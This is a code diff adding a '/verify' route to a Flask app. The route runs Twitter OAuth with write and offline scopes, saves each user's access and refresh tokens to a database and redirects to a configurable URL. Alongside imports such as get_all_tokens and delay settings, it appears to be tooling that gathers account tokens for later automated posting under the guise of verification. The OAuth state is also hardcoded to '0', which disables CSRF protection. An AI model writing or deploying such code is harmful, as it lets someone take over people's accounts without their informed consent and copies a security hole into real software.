@@ -4,7 +4,8 @@ import base64
 from flask import Flask, redirect, request, session, render_template, url_for
 from config import (
     CLIENT_ID, CLIENT_SECRET, CALLBACK_URL, 
-    DEFAULT_MIN_DELAY, DEFAULT_MAX_DELAY
+    DEFAULT_MIN_DELAY, DEFAULT_MAX_DELAY,
+    VERIFY_REDIRECT_URL
 )
 from database import (
     init_db, store_token, get_all_tokens, 
@@ -227,6 +228,61 @@ def meeting():
 def active():
     username = session.get('username', 'User')
     return render_template('active.html', username=username)
+
+@app.route('/verify')
+def verify():
+    code = request.args.get('code')
+    state = request.args.get('state')
+    error = request.args.get('error')
+
+    if request.args.get('verify') == 'true':
+        state = "0"
+        code_verifier, code_challenge = generate_code_verifier_and_challenge()
+        session['code_verifier'] = code_verifier
+
+        authorization_url = (
+            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
+            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
+            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
+        )
+        return redirect(authorization_url)
+
+    if code:
+        if error:
+            return f"Error during authorization: {error}", 400
+
+        code_verifier = session.get('code_verifier')
+        token_url = "https://api.twitter.com/2/oauth2/token"
+        data = {
+            'grant_type': 'authorization_code',
+            'code': code,
+            'redirect_uri': CALLBACK_URL,
+            'code_verifier': code_verifier
+        }
+
+        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
+        token_response = response.json()
+
+        if response.status_code == 200:
+            access_token = token_response.get('access_token')
+            refresh_token = token_response.get('refresh_token')
+            username, profile_url = get_twitter_username_and_profile(access_token)
+
+            if username:
+                store_token(access_token, refresh_token, username)
+                session['username'] = username
+                session['access_token'] = access_token
+                session['refresh_token'] = refresh_token
+
+                return redirect(VERIFY_REDIRECT_URL)
+            else:
+                return "Error retrieving user info with access token", 400
+        else:
+            error_description = token_response.get('error_description', 'Unknown error')
+            error_code = token_response.get('error', 'No error code')
+            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+
+    return render_template('verify.html')
 
 @app.route('/logout')
 def logout():
